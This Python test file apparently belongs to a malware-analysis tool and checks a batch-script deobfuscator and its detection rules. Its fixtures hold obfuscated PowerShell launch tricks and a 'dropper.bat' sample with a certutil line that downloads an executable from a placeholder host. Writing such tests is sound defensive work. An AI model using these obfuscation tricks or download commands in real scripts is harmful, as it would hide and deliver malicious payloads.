"""Tests for the batch/cmd deobfuscator and parser."""

from __future__ import annotations

from docutracex.parsers import bat_deobf, batch


def test_caret_deobfuscation() -> None:
    d = bat_deobf.deobfuscate("p^o^w^e^r^shell -enc AAAA")
    assert d["changed"] and "powershell" in d["code"]
    assert "caret-escape" in d["methods"]


def test_caret_line_continuation() -> None:
    d = bat_deobf.deobfuscate("power^\nshell")
    assert "powershell" in d["code"]


def test_set_var_indirection() -> None:
    d = bat_deobf.deobfuscate("set a=power\nset b=shell\n%a%%b% -nop")
    assert "powershell -nop" in d["code"]
    assert "set-var expansion" in d["methods"]


def test_set_var_substring() -> None:
    # %x:~0,10% takes the first 10 chars → "powershell"
    d = bat_deobf.deobfuscate("set x=powershell.exe\n%x:~0,10% -w hidden")
    assert "powershell -w hidden" in d["code"]


def test_unchanged_plain_batch() -> None:
    d = bat_deobf.deobfuscate("echo hello\ndir")
    assert not d["changed"]


def test_batch_analyze_produces_findings(tmp_path) -> None:
    p = tmp_path / "dropper.bat"
    p.write_text("set a=power^shell\n%a% -enc AAAA\ncertutil -urlcache -f http://x/p.exe p.exe\n")
    res = batch.analyze(p, tmp_path / "none")
    assert res["scripts"], "a .bat file should produce a script entry"
    sc = res["scripts"][0]
    assert sc["code_is_deobfuscated"] and "powershell" in sc["code"]
    rules = {f["rule"] for f in res["findings"]}
    assert {"bat_powershell", "bat_download", "bat_deobfuscated"} <= rules
    # full original source kept for the dump
    assert sc.get("_full_code", "").startswith("set a=power")
